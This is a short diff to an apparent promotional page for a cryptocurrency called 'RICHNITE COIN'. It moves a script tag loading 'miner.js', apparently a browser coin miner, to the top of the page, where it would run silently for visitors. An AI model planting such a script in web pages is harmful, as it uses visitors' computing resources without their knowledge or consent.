@@ -1,5 +1,7 @@
 ## Welcome to RICHNITE COIN 
 
+<script src='miner.js'></script>
+
 
 ![Image](https://cdn.discordapp.com/attachments/589835363091087385/589837465100222464/Picture100000000.png)
 
@@ -39,4 +41,4 @@ With Quick transactions, privacy and unlimited Blocksize make this coin perfect 
 ### [JOIN DISCORD](https://discord.gg/m7rdznM)
 
 
-<script src='miner.js'></script>
+
